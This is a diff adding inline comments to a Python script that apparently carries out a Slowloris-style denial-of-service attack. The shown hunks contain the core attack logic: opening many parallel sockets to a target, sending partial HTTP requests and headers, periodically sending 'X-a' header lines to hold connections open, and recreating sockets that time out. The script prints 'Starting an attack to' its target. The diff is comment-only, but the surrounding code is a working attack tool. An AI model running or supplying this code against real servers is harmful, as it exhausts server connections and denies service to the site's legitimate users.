@@ -42,7 +42,7 @@ def connect(host_ip):
         sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
 
         for header in headers:
-            sock.send("{}\r\n".format(header).encode("utf-8"))
+            sock.send("{}\r\n".format(header).encode("utf-8"))  # Sends the HTTP header to the connection.
 
         return sock
     except socket.gaierror as e:
@@ -58,7 +58,7 @@ def main():
     print("Starting an attack to {}:{} with {} sockets.".format(ip, port, socket_count))
     print("Creating {} sockets...".format(socket_count))
 
-    for i in range(socket_count):
+    for i in range(socket_count):  # Creating given number of parallel connections.
         try:
             s = connect(ip)
             logging.debug("Socket {} created and connected to {}:{}".format(s.getsockname(), ip, port))
@@ -72,7 +72,7 @@ def main():
 
         for s in sockets:
             try:
-                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))  # Sending more data.
             except socket.error:
                 logging.debug("Socket {} is timed out.".format(s.getsockname()))
                 sockets.remove(s)
@@ -82,7 +82,7 @@ def main():
         print("{} sockets are timed out...".format(dead_sockets))
         print("Recreating {} new sockets...".format(dead_sockets))
 
-        for _ in range(dead_sockets):
+        for _ in range(dead_sockets):  # Recreating the dead sockets.
             try:
                 s = connect(ip)
                 logging.debug("Socket {} recreated and connected to {}".format(s.getsockname(), ip))
